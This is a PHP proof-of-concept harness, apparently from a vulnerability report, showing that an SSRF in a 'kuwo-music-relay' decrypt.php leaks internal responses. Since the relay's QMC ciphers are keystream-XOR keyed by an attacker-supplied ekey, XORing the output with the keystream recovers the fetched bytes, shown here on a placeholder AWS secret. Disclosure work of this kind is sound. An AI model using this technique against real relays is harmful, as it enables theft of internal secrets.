<?php
/*
 * PoC Part B — readability of the kuwo-music-relay SSRF.
 *
 * The relay returns  decrypt(fetched_bytes, offset)  to the caller. Both QMC
 * ciphers are keystream-XOR and the keystream is derived ONLY from the
 * attacker-supplied `ekey`, so the attacker recovers the fetched internal
 * response verbatim.
 *
 * This harness needs the relay's cipher classes. Extract them from the target
 * (the first 818 lines of decrypt.php are the self-contained cipher classes,
 * before the MflacRelayServer class and the auto-run bootstrap):
 *
 *     head -818 /path/to/kuwo-music-relay/decrypt.php > ciphers.php
 *     php kuwo-ssrf-readability.php
 */
require __DIR__ . '/ciphers.php';   // EkeyCipher, QmcTea, Map/Rc4 ciphers, factory

// The bytes the relay fetches from an INTERNAL host via the SSRF:
$fetched = "INTERNAL-SECRET: aws_key=AKIA_PRETEND_1234567890 (should never leak)";
$offset  = 0;

function demo(string $label, QmcCipherInterface $cipher, string $fetched, int $offset): void {
    // What the relay sends back to the attacker = decrypt(fetched):
    $serverOutput = $cipher->decrypt($fetched, $offset);

    // The attacker SUPPLIED the ekey, so it reproduces the same cipher and keystream.
    // keystream = decrypt(zero-bytes) because these QMC ciphers are keystream-XOR:
    $ks        = $cipher->decrypt(str_repeat("\0", strlen($fetched)), $offset);
    $recovered = $serverOutput ^ $ks;

    printf("[%s] recovered === fetched ? %s\n", $label, $recovered === $fetched ? 'YES' : 'no');
    printf("        recovered plaintext: %s\n", $recovered);
}

// MapCipher path (QMC key <= 300 bytes)
demo('MapCipher', new MapCipher(random_bytes(200)), $fetched, $offset);
// Rc4Cipher path (QMC key > 300 bytes)
demo('Rc4Cipher', new Rc4Cipher(random_bytes(512)), $fetched, $offset);
